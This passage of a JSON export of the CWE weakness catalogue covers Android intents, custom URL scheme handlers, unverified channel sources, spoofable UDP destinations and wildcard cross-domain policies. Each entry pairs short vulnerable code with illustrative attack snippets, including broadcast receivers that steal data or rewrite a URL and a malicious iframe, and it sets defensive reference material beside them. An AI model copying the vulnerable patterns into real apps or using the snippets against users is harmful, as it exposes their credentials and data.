          "Description": "Automated static analysis, commonly referred to as Static Application Security Testing (SAST), can find some instances of this weakness by analyzing source code (or binary/compiled code) without having to execute it. Typically, this is done by building a model of data flow and control flow, then searching for potentially-vulnerable patterns that connect \"sources\" (origins of input) with \"sinks\" (destinations where the data interacts with external components, a lower layer such as the OS, etc.)",
          "Effectiveness": "High"
        }
      ],
      "PotentialMitigations": [
        {
          "Phase": [
            "Implementation"
          ],
          "Description": "If the application only requires communication with its own components, then the destination is always known, and an explicit intent could be used."
        }
      ],
      "DemonstrativeExamples": [
        {
          "Entries": [
            {
              "IntroText": "This application wants to create a user account in several trusted applications using one broadcast intent:"
            },
            {
              "Nature": "Bad",
              "Language": "Java",
              "ExampleCode": "```\n\tIntent intent = new Intent();\n\tintent.setAction(\"com.example.CreateUser\");\n\tintent.putExtra(\"Username\", uname_string);\n\tintent.putExtra(\"Password\", pw_string);\n\tsendBroadcast(intent);\n```"
            },
            {
              "BodyText": "This application assumes only the trusted applications will be listening for the action. A malicious application can register for this action and intercept the user's login information, as below:"
            },
            {
              "Nature": "Attack",
              "Language": "Java",
              "ExampleCode": "```\n\tIntentFilter filter = new IntentFilter(\"com.example.CreateUser\");\n\tMyReceiver receiver = new MyReceiver();\n\tregisterReceiver(receiver, filter);\n```"
            },
            {
              "BodyText": "When a broadcast contains sensitive information, create an allowlist of applications that can receive the action using the application's manifest file, or programmatically send the intent to each individual intended receiver."
            }
          ]
        },
        {
          "Entries": [
            {
              "IntroText": "This application interfaces with a web service that requires a separate user login. It creates a sticky intent, so that future trusted applications that also use the web service will know who the current user is:"
            },
            {
              "Nature": "Bad",
              "Language": "Java",
              "ExampleCode": "```\n\tIntent intent = new Intent();\n\tintent.setAction(\"com.example.service.UserExists\");\n\tintent.putExtra(\"Username\", uname_string);\n\tsendStickyBroadcast(intent);\n```"
            },
            {
              "Nature": "Attack",
              "Language": "Java",
              "ExampleCode": "```\n\tIntentFilter filter = new IntentFilter(\"com.example.service.UserExists\");\n\tMyReceiver receiver = new MyReceiver();\n\tregisterReceiver(receiver, filter);\n```"
            },
            {
              "BodyText": "Sticky broadcasts can be read by any application at any time, and so should never contain sensitive information such as a username."
            }
          ]
        },
        {
          "Entries": [
            {
              "IntroText": "This application is sending an ordered broadcast, asking other applications to open a URL:"
            },
            {
              "Nature": "Bad",
              "Language": "Java",
              "ExampleCode": "```\n\tIntent intent = new Intent();\n\tintent.setAction(\"com.example.OpenURL\");\n\tintent.putExtra(\"URL_TO_OPEN\", url_string);\n\tsendOrderedBroadcastAsUser(intent);\n```"
            },
            {
              "BodyText": "Any application in the broadcast chain may alter the data within the intent. This malicious application is altering the URL to point to an attack site:"
            },
            {
              "Nature": "Attack",
              "Language": "Java",
              "ExampleCode": "```\n\tpublic class CallReceiver extends BroadcastReceiver {\n\t\t@Override\n\t\tpublic void onReceive(Context context, Intent intent) {\n\t\t\tString Url = intent.getStringExtra(Intent.URL_TO_OPEN);\n\t\t\tattackURL = \"www.example.com/attack?\" + Url;\n\t\t\tsetResultData(attackURL);\n\t\t}\n\t}\n```"
            },
            {
              "BodyText": "The final receiving application will then open the attack URL. Where possible, send intents to specific trusted applications instead of using a broadcast chain."
            }
          ]
        },
        {
          "ID": "DX-108",
          "Entries": [
            {
              "IntroText": "This application sends a special intent with a flag that allows the receiving application to read a data file for backup purposes."
            },
            {
              "Nature": "Bad",
              "Language": "Java",
              "ExampleCode": "```\n\tIntent intent = new Intent();\n\tintent.setAction(\"com.example.BackupUserData\");\n\tintent.setData(file_uri);\n\tintent.addFlags(FLAG_GRANT_READ_URI_PERMISSION);\n\tsendBroadcast(intent);\n```"
            },
            {
              "Nature": "Attack",
              "Language": "Java",
              "ExampleCode": "```\n\tpublic class CallReceiver extends BroadcastReceiver {\n\t\t@Override\n\t\tpublic void onReceive(Context context, Intent intent) {\n\t\t\tUri userData = intent.getData();\n\t\t\tstealUserData(userData);\n\t\t}\n\t}\n```"
            },
            {
              "BodyText": "Any malicious application can register to receive this intent. Because of the FLAG_GRANT_READ_URI_PERMISSION included with the intent, the malicious receiver code can read the user's data."
            }
          ]
        }
      ],
      "ObservedExamples": [
        {
          "Reference": "CVE-2022-4903",
          "Description": "An Android application does not use FLAG_IMMUTABLE when creating a PendingIntent.",
          "Link": "https://www.cve.org/CVERecord?id=CVE-2022-4903"
        }
      ],
      "References": [
        {
          "ExternalReferenceID": "REF-922",
          "Section": "3.2.1",
          "Authors": [
            "Erika Chin",
            "Adrienne Porter Felt",
            "Kate Greenwood",
            "David Wagner"
          ],
          "Title": "Analyzing Inter-Application Communication in Android",
          "URL": "http://www.eecs.berkeley.edu/~daw/papers/intents-mobisys11.pdf"
        },
        {
          "ExternalReferenceID": "REF-923",
          "Authors": [
            "Android Open Source Project"
          ],
          "Title": "Security Tips",
          "PublicationYear": "2013",
          "PublicationMonth": "07",
          "PublicationDay": "16",
          "URL": "https://developer.android.com/training/articles/security-tips#ContentProviders",
          "URLDate": "2023-04-07"
        }
      ],
      "MappingNotes": {
        "Usage": "Allowed",
        "Rationale": "This CWE entry is at the Variant level of abstraction, which is a preferred level of abstraction for mapping to the root causes of vulnerabilities.",
        "Comments": "Carefully read both the name and description to ensure that this mapping is an appropriate fit. Do not try to 'force' a mapping to a lower-level Base/Variant simply to comply with this preferred level of abstraction.",
        "Reasons": [
          "Acceptable-Use"
        ]
      }
    },
    {
      "ID": "939",
      "Name": "Improper Authorization in Handler for Custom URL Scheme",
      "Abstraction": "Base",
      "Structure": "Simple",
      "Status": "Incomplete",
      "Description": "The product uses a handler for a custom URL scheme, but it does not properly restrict which actors can invoke the handler using the scheme.",
      "ExtendedDescription": "Mobile platforms and other architectures allow the use of custom URL schemes to facilitate communication between applications. In the case of iOS, this is the only method to do inter-application communication. The implementation is at the developer's discretion which may open security flaws in the application. An example could be potentially dangerous functionality such as modifying files through a custom URL scheme.",
      "RelatedWeaknesses": [
        {
          "Nature": "ChildOf",
          "CweID": "862",
          "ViewID": "1000",
          "Ordinal": "Primary"
        }
      ],
      "ApplicablePlatforms": [
        {
          "Type": "Technology",
          "Class": "Mobile",
          "Prevalence": "Undetermined"
        }
      ],
      "ModesOfIntroduction": [
        {
          "Phase": "Implementation",
          "Note": "REALIZATION: This weakness is caused during implementation of an architectural security tactic."
        }
      ],
      "PotentialMitigations": [
        {
          "Phase": [
            "Architecture and Design"
          ],
          "Description": "\n\nUtilize a user prompt pop-up to authorize potentially harmful actions such as those modifying data or dealing with sensitive information.\n\n\nWhen designing functionality of actions in the URL scheme, consider whether the action should be accessible to all mobile applications, or if an allowlist of applications to interface with is appropriate.\n"
        }
      ],
      "DemonstrativeExamples": [
        {
          "Entries": [
            {
              "IntroText": "This iOS application uses a custom URL scheme. The replaceFileText action in the URL scheme allows an external application to interface with the file incomingMessage.txt and replace the contents with the text field of the query string."
            },
            {
              "BodyText": "External Application"
            },
            {
              "Nature": "Good",
              "Language": "Objective-C",
              "ExampleCode": "```\n\tNSString *stringURL = @\"appscheme://replaceFileText?file=incomingMessage.txt&text=hello\";\n\tNSURL *url = [NSURL URLWithString:stringURL];\n\t[[UIApplication sharedApplication] openURL:url];\n```"
            },
            {
              "BodyText": "Application URL Handler"
            },
            {
              "Nature": "Bad",
              "ExampleCode": "```\n\t- (BOOL)application:(UIApplication *)application handleOpenURL:(NSURL *)url {\n\t\tif (!url) {\n\t\t\treturn NO;\n\t\t}\n\t\tNSString *action = [url host];\n\t\tif([action isEqualToString: @\"replaceFileText\"]) {\n\t\t\tNSDictionary *dict = [self parseQueryStringExampleFunction:[url query]];\n```\n//this function will write contents to a specified file* \n\t\t\tFileObject *objectFile = [self writeToFile:[dict objectForKey: @\"file\"] withText:[dict objectForKey: @\"text\"]];}\n\t\treturn YES;}"
            },
            {
              "BodyText": "The handler has no restriction on who can use its functionality. The handler can be invoked using any method that invokes the URL handler such as the following malicious iframe embedded on a web page opened by Safari."
            },
            {
              "Nature": "Attack",
              "Language": "HTML",
              "ExampleCode": "```\n\t<iframe src=\"appscheme://replaceFileText?file=Bookmarks.dat&text=listOfMaliciousWebsites\">\n```"
            },
            {
              "BodyText": "The attacker can host a malicious website containing the iframe and trick users into going to the site via a crafted phishing email. Since Safari automatically executes iframes, the user is not prompted when the handler executes the iframe code which automatically invokes the URL handler replacing the bookmarks file with a list of malicious websites. Since replaceFileText is a potentially dangerous action, an action that modifies data, there should be a sanity check before the writeToFile:withText: function."
            }
          ]
        },
        {
          "ID": "DX-109",
          "Entries": [
            {
              "IntroText": "These Android and iOS applications intercept URL loading within a WebView and perform special actions if a particular URL scheme is used, thus allowing the Javascript within the WebView to communicate with the application:"
            },
            {
              "Nature": "Bad",
              "Language": "Java",
              "ExampleCode": "```\n```\n// Android* \n\t@Override\n\tpublic boolean shouldOverrideUrlLoading(WebView view, String url){\n\t```\n\t\t\tif (url.substring(0,14).equalsIgnoreCase(\"examplescheme:\")){\n\t\t\t\tif(url.substring(14,25).equalsIgnoreCase(\"getUserInfo\")){\n\t\t\t\t\twriteDataToView(view, UserData);\n\t\t\t\t\treturn false;\n\t\t\t\t}\n\t\t\t\telse{\n\t\t\t\t\treturn true;\n\t\t\t\t}\n\t\t\t}\n\t}\n```"
            },
            {
              "Nature": "Bad",
              "Language": "Objective-C",
              "ExampleCode": "```\n```\n// iOS* \n\t-(BOOL) webView:(UIWebView *)exWebView shouldStartLoadWithRequest:(NSURLRequest *)exRequest navigationType:(UIWebViewNavigationType)exNavigationType\n\t{\n\t```\n\t\t\tNSURL *URL = [exRequest URL];\n\t\t\tif ([[URL scheme] isEqualToString:@\"exampleScheme\"])\n\t\t\t{\n\t\t\t\t\tNSString *functionString = [URL resourceSpecifier];\n\t\t\t\t\tif ([functionString hasPrefix:@\"specialFunction\"])\n\t\t\t\t\t{\n```\n// Make data available back in webview.* \n\t\t\t\t\t\t\tUIWebView *webView = [self writeDataToView:[URL query]];}\n\t\t\t\t\treturn NO;}\n\t\t\treturn YES;}"
            },
            {
              "BodyText": "A call into native code can then be initiated by passing parameters within the URL:"
            },
            {
              "Nature": "Attack",
              "Language": "JavaScript",
              "ExampleCode": "```\n\twindow.location = examplescheme://method?parameter=value\n```"
            },
            {
              "BodyText": "Because the application does not check the source, a malicious website loaded within this WebView has the same access to the API as a trusted site."
            }
          ]
        }
      ],
      "ObservedExamples": [
        {
          "Reference": "CVE-2013-5725",
          "Description": "URL scheme has action replace which requires no user prompt and allows remote attackers to perform undesired actions.",
          "Link": "https://www.cve.org/CVERecord?id=CVE-2013-5725"
        },
        {
          "Reference": "CVE-2013-5726",
          "Description": "URL scheme has action follow and favorite which allows remote attackers to force user to perform undesired actions.",
          "Link": "https://www.cve.org/CVERecord?id=CVE-2013-5726"
        }
      ],
      "References": [
        {
          "ExternalReferenceID": "REF-938",
          "Authors": [
            "Guillaume Ross"
          ],
          "Title": "Scheming for Privacy and Security",
          "PublicationYear": "2013",
          "PublicationMonth": "11",
          "PublicationDay": "11",
          "URL": "https://brooksreview.net/2013/11/guest-post_scheming-for-privacy-and-security/",
          "URLDate": "2023-04-07"
        }
      ],
      "MappingNotes": {
        "Usage": "Allowed",
        "Rationale": "This CWE entry is at the Base level of abstraction, which is a preferred level of abstraction for mapping to the root causes of vulnerabilities.",
        "Comments": "Carefully read both the name and description to ensure that this mapping is an appropriate fit. Do not try to 'force' a mapping to a lower-level Base/Variant simply to comply with this preferred level of abstraction.",
        "Reasons": [
          "Acceptable-Use"
        ]
      }
    },
    {
      "ID": "940",
      "Name": "Improper Verification of Source of a Communication Channel",
      "Abstraction": "Base",
      "Structure": "Simple",
      "Status": "Incomplete",
      "Description": "The product establishes a communication channel to handle an incoming request that has been initiated by an actor, but it does not properly verify that the request is coming from the expected origin.",
      "ExtendedDescription": "When an attacker can successfully establish a communication channel from an untrusted origin, the attacker may be able to gain privileges and access unexpected functionality.",
      "RelatedWeaknesses": [
        {
          "Nature": "ChildOf",
          "CweID": "923",
          "ViewID": "1000",
          "Ordinal": "Primary"
        },
        {
          "Nature": "ChildOf",
          "CweID": "346",
          "ViewID": "1000"
        }
      ],
      "ApplicablePlatforms": [
        {
          "Type": "Language",
          "Class": "Not Language-Specific",
          "Prevalence": "Undetermined"
        },
        {
          "Type": "Technology",
          "Class": "Mobile",
          "Prevalence": "Undetermined"
        }
      ],
      "ModesOfIntroduction": [
        {
          "Phase": "Architecture and Design"
        },
        {
          "Phase": "Implementation",
          "Note": "REALIZATION: This weakness is caused during implementation of an architectural security tactic."
        }
      ],
      "CommonConsequences": [
        {
          "Scope": [
            "Access Control",
            "Other"
          ],
          "Impact": [
            "Gain Privileges or Assume Identity",
            "Varies by Context"
          ],
          "Note": "An attacker can access any functionality that is inadvertently accessible to the source."
        }
      ],
      "PotentialMitigations": [
        {
          "Phase": [
            "Architecture and Design"
          ],
          "Description": "\n\nUse a mechanism that can validate the identity of the source, such as a certificate, and validate the integrity of data to ensure that it cannot be modified in transit using an Adversary-in-the-Middle (AITM) attack.\n\n\nWhen designing functionality of actions in the URL scheme, consider whether the action should be accessible to all mobile applications, or if an allowlist of applications to interface with is appropriate.\n"
        }
      ],
      "DemonstrativeExamples": [
        {
          "ID": "DX-112",
          "Entries": [
            {
              "IntroText": "This Android application will remove a user account when it receives an intent to do so:"
            },
            {
              "Nature": "Bad",
              "Language": "Java",
              "ExampleCode": "```\n\tIntentFilter filter = new IntentFilter(\"com.example.RemoveUser\");\n\tMyReceiver receiver = new MyReceiver();\n\tregisterReceiver(receiver, filter);\n\tpublic class DeleteReceiver extends BroadcastReceiver {\n\t\t@Override\n\t\tpublic void onReceive(Context context, Intent intent) {\n\t\t\tint userID = intent.getIntExtra(\"userID\");\n\t\t\tdestroyUserData(userID);\n\t\t}\n\t}\n```"
            },
            {
              "BodyText": "This application does not check the origin of the intent, thus allowing any malicious application to remove a user. Always check the origin of an intent, or create an allowlist of trusted applications using the manifest.xml file."
            }
          ]
        },
        {
          "ID": "DX-109",
          "Entries": [
            {
              "IntroText": "These Android and iOS applications intercept URL loading within a WebView and perform special actions if a particular URL scheme is used, thus allowing the Javascript within the WebView to communicate with the application:"
            },
            {
              "Nature": "Bad",
              "Language": "Java",
              "ExampleCode": "```\n```\n// Android* \n\t@Override\n\tpublic boolean shouldOverrideUrlLoading(WebView view, String url){\n\t```\n\t\t\tif (url.substring(0,14).equalsIgnoreCase(\"examplescheme:\")){\n\t\t\t\tif(url.substring(14,25).equalsIgnoreCase(\"getUserInfo\")){\n\t\t\t\t\twriteDataToView(view, UserData);\n\t\t\t\t\treturn false;\n\t\t\t\t}\n\t\t\t\telse{\n\t\t\t\t\treturn true;\n\t\t\t\t}\n\t\t\t}\n\t}\n```"
            },
            {
              "Nature": "Bad",
              "Language": "Objective-C",
              "ExampleCode": "```\n```\n// iOS* \n\t-(BOOL) webView:(UIWebView *)exWebView shouldStartLoadWithRequest:(NSURLRequest *)exRequest navigationType:(UIWebViewNavigationType)exNavigationType\n\t{\n\t```\n\t\t\tNSURL *URL = [exRequest URL];\n\t\t\tif ([[URL scheme] isEqualToString:@\"exampleScheme\"])\n\t\t\t{\n\t\t\t\t\tNSString *functionString = [URL resourceSpecifier];\n\t\t\t\t\tif ([functionString hasPrefix:@\"specialFunction\"])\n\t\t\t\t\t{\n```\n// Make data available back in webview.* \n\t\t\t\t\t\t\tUIWebView *webView = [self writeDataToView:[URL query]];}\n\t\t\t\t\treturn NO;}\n\t\t\treturn YES;}"
            },
            {
              "BodyText": "A call into native code can then be initiated by passing parameters within the URL:"
            },
            {
              "Nature": "Attack",
              "Language": "JavaScript",
              "ExampleCode": "```\n\twindow.location = examplescheme://method?parameter=value\n```"
            },
            {
              "BodyText": "Because the application does not check the source, a malicious website loaded within this WebView has the same access to the API as a trusted site."
            }
          ]
        }
      ],
      "ObservedExamples": [
        {
          "Reference": "CVE-2000-1218",
          "Description": "DNS server can accept DNS updates from hosts that it did not query, leading to cache poisoning",
          "Link": "https://www.cve.org/CVERecord?id=CVE-2000-1218"
        },
        {
          "Reference": "CVE-2005-0877",
          "Description": "DNS server can accept DNS updates from hosts that it did not query, leading to cache poisoning",
          "Link": "https://www.cve.org/CVERecord?id=CVE-2005-0877"
        },
        {
          "Reference": "CVE-2001-1452",
          "Description": "DNS server caches glue records received from non-delegated name servers",
          "Link": "https://www.cve.org/CVERecord?id=CVE-2001-1452"
        }
      ],
      "RelatedAttackPatterns": [
        "500",
        "594",
        "595",
        "596"
      ],
      "References": [
        {
          "ExternalReferenceID": "REF-324",
          "Authors": [
            "Taimur Aslam"
          ],
          "Title": "A Taxonomy of Security Faults in the UNIX Operating System",
          "PublicationYear": "1995",
          "PublicationMonth": "08",
          "PublicationDay": "01",
          "URL": "http://cwe.mitre.org/documents/sources/ATaxonomyofSecurityFaultsintheUNIXOperatingSystem%5BAslam95%5D.pdf"
        }
      ],
      "MappingNotes": {
        "Usage": "Allowed",
        "Rationale": "This CWE entry is at the Base level of abstraction, which is a preferred level of abstraction for mapping to the root causes of vulnerabilities.",
        "Comments": "Carefully read both the name and description to ensure that this mapping is an appropriate fit. Do not try to 'force' a mapping to a lower-level Base/Variant simply to comply with this preferred level of abstraction.",
        "Reasons": [
          "Acceptable-Use"
        ]
      },
      "Notes": [
        {
          "Type": "Relationship",
          "Note": "While many access control issues involve authenticating the user, this weakness is more about authenticating the actual source of the communication channel itself; there might not be any \"user\" in such cases."
        }
      ]
    },
    {
      "ID": "941",
      "Name": "Incorrectly Specified Destination in a Communication Channel",
      "Abstraction": "Base",
      "Structure": "Simple",
      "Status": "Incomplete",
      "Description": "The product creates a communication channel to initiate an outgoing request to an actor, but it does not correctly specify the intended destination for that actor.",
      "ExtendedDescription": "\n\nAttackers at the destination may be able to spoof trusted servers to steal data or cause a denial of service.\n\n\nThere are at least two distinct weaknesses that can cause the product to communicate with an unintended destination:\n\n\n  - If the product allows an attacker to control which destination is specified, then the attacker can cause it to connect to an untrusted or malicious destination. For example, because UDP is a connectionless protocol, UDP packets can be spoofed by specifying a false source address in the packet; when the server receives the packet and sends a reply, it will specify a destination by using the source of the incoming packet - i.e., the false source. The server can then be tricked into sending traffic to the wrong host, which is effective for hiding the real source of an attack and for conducting a distributed denial of service (DDoS). As another example, server-side request forgery (SSRF) and XML External Entity (XXE) can be used to trick a server into making outgoing requests to hosts that cannot be directly accessed by the attacker due to firewall restrictions.\n\n  - If the product incorrectly specifies the destination, then an attacker who can control this destination might be able to spoof trusted servers. While the most common occurrence is likely due to misconfiguration by an administrator, this can be resultant from other weaknesses. For example, the product might incorrectly parse an e-mail or IP address and send sensitive data to an unintended destination. As another example, an Android application may use a \"sticky broadcast\" to communicate with a receiver for a particular application, but since sticky broadcasts can be processed by *any* receiver, this can allow a malicious application to access restricted data that was only intended for a different application.\n\n",
      "RelatedWeaknesses": [
        {
          "Nature": "ChildOf",
          "CweID": "923",
          "ViewID": "1000",
          "Ordinal": "Primary"
        },
        {
          "Nature": "CanPrecede",
          "CweID": "406",
          "ViewID": "1000"
        }
      ],
      "ApplicablePlatforms": [
        {
          "Type": "Language",
          "Class": "Not Language-Specific",
          "Prevalence": "Undetermined"
        },
        {
          "Type": "Technology",
          "Class": "Mobile",
          "Prevalence": "Undetermined"
        }
      ],
      "ModesOfIntroduction": [
        {
          "Phase": "Architecture and Design"
        },
        {
          "Phase": "Implementation",
          "Note": "REALIZATION: This weakness is caused during implementation of an architectural security tactic."
        }
      ],
      "DemonstrativeExamples": [
        {
          "ID": "DX-113",
          "Entries": [
            {
              "IntroText": "This code listens on a port for DNS requests and sends the result to the requesting address."
            },
            {
              "Nature": "Bad",
              "Language": "Python",
              "ExampleCode": "```\n\tsock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)\n\tsock.bind( (UDP_IP,UDP_PORT) )\n\twhile true:\n\t\t\tdata = sock.recvfrom(1024)\n\t\t\tif not data:\n\t\t\t\tbreak\n\t\t\t(requestIP, nameToResolve) = parseUDPpacket(data)\n\t\t\trecord = resolveName(nameToResolve)\n\t\t\tsendResponse(requestIP,record)\n```"
            },
            {
              "BodyText": "This code sends a DNS record to a requesting IP address. UDP allows the source IP address to be easily changed ('spoofed'), thus allowing an attacker to redirect responses to a target, which may be then be overwhelmed by the network traffic."
            }
          ]
        }
      ],
      "ObservedExamples": [
        {
          "Reference": "CVE-2013-5211",
          "Description": "composite: NTP feature generates large responses (high amplification factor) with spoofed UDP source addresses.",
          "Link": "https://www.cve.org/CVERecord?id=CVE-2013-5211"
        },
        {
          "Reference": "CVE-1999-0513",
          "Description": "Classic \"Smurf\" attack, using spoofed ICMP packets to broadcast addresses.",
          "Link": "https://www.cve.org/CVERecord?id=CVE-1999-0513"
        },
        {
          "Reference": "CVE-1999-1379",
          "Description": "DNS query with spoofed source address causes more traffic to be returned to spoofed address than was sent by the attacker.",
          "Link": "https://www.cve.org/CVERecord?id=CVE-1999-1379"
        }
      ],
      "References": [
        {
          "ExternalReferenceID": "REF-941",
          "Authors": [
            "US-CERT"
          ],
          "Title": "UDP-based Amplification Attacks",
          "PublicationYear": "2014",
          "PublicationMonth": "01",
          "PublicationDay": "17",
          "URL": "https://www.us-cert.gov/ncas/alerts/TA14-017A"
        },
        {
          "ExternalReferenceID": "REF-942",
          "Authors": [
            "Fortify"
          ],
          "Title": "Android Bad Practices: Sticky Broadcast",
          "URL": "https://www.hpe.com/us/en/solutions/infrastructure-security.html?jumpid=va_wnmstr1ug6_aid-510326901",
          "URLDate": "2023-04-07"
        }
      ],
      "MappingNotes": {
        "Usage": "Allowed",
        "Rationale": "This CWE entry is at the Base level of abstraction, which is a preferred level of abstraction for mapping to the root causes of vulnerabilities.",
        "Comments": "Carefully read both the name and description to ensure that this mapping is an appropriate fit. Do not try to 'force' a mapping to a lower-level Base/Variant simply to comply with this preferred level of abstraction.",
        "Reasons": [
          "Acceptable-Use"
        ]
      }
    },
    {
      "ID": "942",
      "Name": "Permissive Cross-domain Policy with Untrusted Domains",
      "Abstraction": "Variant",
      "Structure": "Simple",
      "Status": "Incomplete",
      "Description": "The product uses a cross-domain policy file that includes domains that should not be trusted.",
      "ExtendedDescription": "\n\nA cross-domain policy file (\"crossdomain.xml\" in Flash and \"clientaccesspolicy.xml\" in Silverlight) defines a list of domains from which a server is allowed to make cross-domain requests. When making a cross-domain request, the Flash or Silverlight client will first look for the policy file on the target server. If it is found, and the domain hosting the application is explicitly allowed to make requests, the request is made.\n\n\nTherefore, if a cross-domain policy file includes domains that should not be trusted, such as when using wildcards, then the application could be attacked by these untrusted domains.\n\n\nAn overly permissive policy file allows many of the same attacks seen in Cross-Site Scripting (CWE-79). Once the user has executed a malicious Flash or Silverlight application, they are vulnerable to a variety of attacks. The attacker could transfer private information, such as cookies that may include session information, from the victim's machine to the attacker. The attacker could send malicious requests to a web site on behalf of the victim, which could be especially dangerous to the site if the victim has administrator privileges to manage that site.\n\n\nIn many cases, the attack can be launched without the victim even being aware of it.\n",
      "RelatedWeaknesses": [
        {
          "Nature": "ChildOf",
          "CweID": "863",
          "ViewID": "1000",
          "Ordinal": "Primary"
        },
        {
          "Nature": "ChildOf",
          "CweID": "923",
          "ViewID": "1000"
        },
        {
          "Nature": "ChildOf",
          "CweID": "183",
          "ViewID": "1000"
        },
        {
          "Nature": "CanPrecede",
          "CweID": "668",
          "ViewID": "1000"
        }
      ],
      "ApplicablePlatforms": [
        {
          "Type": "Language",
          "Class": "Not Language-Specific",
          "Prevalence": "Undetermined"
        },
        {
          "Type": "Technology",
          "Class": "Web Based",
          "Prevalence": "Undetermined"
        }
      ],
      "ModesOfIntroduction": [
        {
          "Phase": "Implementation"
        },
        {
          "Phase": "Architecture and Design",
          "Note": "COMMISSION: This weakness refers to an incorrect design related to an architectural security tactic."
        }
      ],
      "CommonConsequences": [
        {
          "Scope": [
            "Confidentiality",
            "Integrity",
            "Availability",
            "Access Control"
          ],
          "Impact": [
            "Execute Unauthorized Code or Commands",
            "Bypass Protection Mechanism",
            "Read Application Data",
            "Varies by Context"
          ],
          "Note": "An attacker may be able to bypass the web browser's same-origin policy. An attacker can exploit the weakness to manipulate or steal cookies, create requests that can be mistaken for those of a valid user, compromise confidential information, or execute malicious code on the end user systems for a variety of nefarious purposes. Other damaging attacks include the disclosure of end user files, installation of Trojan horse programs, redirecting the user to some other page or site, running ActiveX controls (under Microsoft Internet Explorer) from sites that a user perceives as trustworthy, and modifying presentation of content."
        }
      ],
      "DetectionMethods": [
        {
          "DetectionMethodID": "DM-14",
          "Method": "Automated Static Analysis",
          "Description": "Automated static analysis, commonly referred to as Static Application Security Testing (SAST), can find some instances of this weakness by analyzing source code (or binary/compiled code) without having to execute it. Typically, this is done by building a model of data flow and control flow, then searching for potentially-vulnerable patterns that connect \"sources\" (origins of input) with \"sinks\" (destinations where the data interacts with external components, a lower layer such as the OS, etc.)",
          "Effectiveness": "High"
        }
      ],
      "PotentialMitigations": [
        {
          "Phase": [
            "Architecture and Design"
          ],
          "Strategy": "Attack Surface Reduction",
          "Description": "Avoid using wildcards in the cross-domain policy file. Any domain matching the wildcard expression will be implicitly trusted, and can perform two-way interaction with the target server."
        },
        {
          "Phase": [
            "Architecture and Design",
            "Operation"
          ],
          "Strategy": "Environment Hardening",
          "Description": "For Flash, modify crossdomain.xml to use meta-policy options such as 'master-only' or 'none' to reduce the possibility of an attacker planting extraneous cross-domain policy files on a server."
        },
        {
          "Phase": [
            "Architecture and Design",
            "Operation"
          ],
          "Strategy": "Attack Surface Reduction",
          "Description": "For Flash, modify crossdomain.xml to use meta-policy options such as 'master-only' or 'none' to reduce the possibility of an attacker planting extraneous cross-domain policy files on a server."
        }
      ],
      "DemonstrativeExamples": [
        {
          "ID": "DX-208",
          "Entries": [
            {
              "IntroText": "These cross-domain policy files mean to allow Flash and Silverlight applications hosted on other domains to access its data:"
            },
            {
              "BodyText": "Flash crossdomain.xml :"
            },
            {
              "Nature": "Bad",
              "Language": "XML",
              "ExampleCode": "```\n\t<cross-domain-policy xmlns:xsi=\"http://www.w3.org/2001/XMLSchema-instance\"\n\txsi:noNamespaceSchemaLocation=\"http://www.adobe.com/xml/schemas/PolicyFile.xsd\">\n\t<allow-access-from domain=\"*.example.com\"/>\n\t<allow-access-from domain=\"*\"/>\n\t</cross-domain-policy>\n```"
            },
            {
              "BodyText": "Silverlight clientaccesspolicy.xml :"
            },
            {
              "Nature": "Bad",
              "Language": "XML",
              "ExampleCode": "```\n\t<?xml version=\"1.0\" encoding=\"utf-8\"?>\n\t<access-policy>\n\t<cross-domain-access>\n\t<policy>\n\t<allow-from http-request-headers=\"SOAPAction\">\n\t<domain uri=\"*\"/>\n\t</allow-from>\n\t<grant-to>\n\t<resource path=\"/\" include-subpaths=\"true\"/>\n\t</grant-to>\n\t</policy>\n\t</cross-domain-access>\n\t</access-policy>\n```"
            },
            {
              "BodyText": "These entries are far too permissive, allowing any Flash or Silverlight application to send requests. A malicious application hosted on any other web site will be able to send requests on behalf of any user tricked into executing it."
            }
          ]
        }
      ],
      "ObservedExamples": [
        {
          "Reference": "CVE-2012-2292",
          "Description": "Product has a Silverlight cross-domain policy that does not restrict access to another application, which allows remote attackers to bypass the Same Origin Policy.",
          "Link": "https://www.cve.org/CVERecord?id=CVE-2012-2292"
        },
        {
          "Reference": "CVE-2014-2049",
          "Description": "The default Flash Cross Domain policies in a product allows remote attackers to access user files.",
          "Link": "https://www.cve.org/CVERecord?id=CVE-2014-2049"
        },
        {
          "Reference": "CVE-2007-6243",
          "Description": "Chain: Adobe Flash Player does not sufficiently restrict the interpretation and usage of cross-domain policy files, which makes it easier for remote attackers to conduct cross-domain and cross-site scripting (XSS) attacks.",
          "Link": "https://www.cve.org/CVERecord?id=CVE-2007-6243"
        },
        {
          "Reference": "CVE-2008-4822",
          "Description": "Chain: Adobe Flash Player and earlier does not properly interpret policy files, which allows remote attackers to bypass a non-root domain policy.",
          "Link": "https://www.cve.org/CVERecord?id=CVE-2008-4822"
        },
        {
          "Reference": "CVE-2010-3636",
          "Description": "Chain: Adobe Flash Player does not properly handle unspecified encodings during the parsing of a cross-domain policy file, which allows remote web servers to bypass intended access restrictions via unknown vectors.",
          "Link": "https://www.cve.org/CVERecord?id=CVE-2010-3636"
        }
      ],
      "References": [
        {
          "ExternalReferenceID": "REF-943",
          "Authors": [
            "Apurva Udaykumar"
          ],
          "Title": "Setting a crossdomain.xml file for HTTP streaming",
          "PublicationYear": "2012",
          "PublicationMonth": "11",
          "PublicationDay": "19",
          "Publisher": "Adobe",
          "URL": "https://web.archive.org/web/20121124184922/http://www.adobe.com/devnet/adobe-media-server/articles/cross-domain-xml-for-streaming.html",
          "URLDate": "2023-04-07"
        },
        {
          "ExternalReferenceID": "REF-944",
          "Authors": [
            "Adobe"
          ],
          "Title": "Cross-domain policy for Flash movies",
          "Publisher": "Adobe",
          "URL": "http://kb2.adobe.com/cps/142/tn_14213.html"
        },
        {
          "ExternalReferenceID": "REF-945",
          "Authors": [
            "Microsoft Corporation"
          ],
          "Title": "HTTP Communication and Security with Silverlight",
          "URL": "https://learn.microsoft.com/en-us/previous-versions/windows/silverlight/dotnet-windows-silverlight/cc838250(v=vs.95)?redirectedfrom=MSDN",
          "URLDate": "2023-04-07"
        },
        {
          "ExternalReferenceID": "REF-946",
          "Authors": [
            "Microsoft Corporation"
          ],
          "Title": "Network Security Access Restrictions in Silverlight",
          "URL": "https://learn.microsoft.com/en-us/previous-versions/windows/silverlight/dotnet-windows-silverlight/cc645032(v=vs.95)",
          "URLDate": "2023-04-07"
        },
        {
          "ExternalReferenceID": "REF-947",
          "Authors": [
            "Dongseok Jang",
            "Aishwarya Venkataraman",
            "G. Michael Sawka",
            "Hovav Shacham"
          ],
          "Title": "Analyzing the Crossdomain Policies of Flash Applications",
